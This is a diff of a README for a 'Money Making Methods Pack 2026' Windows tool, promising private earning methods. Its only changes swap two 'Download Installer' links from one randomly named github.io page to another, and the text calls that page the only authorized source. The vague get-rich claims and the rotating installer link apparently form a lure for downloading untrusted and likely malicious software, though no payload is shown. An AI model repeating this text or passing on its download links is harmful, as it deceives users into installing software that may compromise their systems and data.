@@ -2,7 +2,7 @@
 
 Money Making Methods Pack 2026 is the ultimate collection of advanced money making techniques and tools designed for Windows users. This pack includes private methods, profit optimization features, and a comprehensive suite to maximize your earnings in 2026. Whether you are a beginner or an experienced entrepreneur, this pack provides valuable insights and practical tools to help you succeed.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Overview
 
@@ -62,7 +62,7 @@ If you face any problems, refer to the built-in help section or visit our suppor
 
 To access the latest version of the Money Making Methods Pack 2026, please visit the official download page using the link below. This is the only authorized source for obtaining the software, and it ensures you receive the safest and most up-to-date version.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 Note: Be cautious of third-party sites that may host modified or unsafe versions. Always download from official channels to protect your system and data.
 
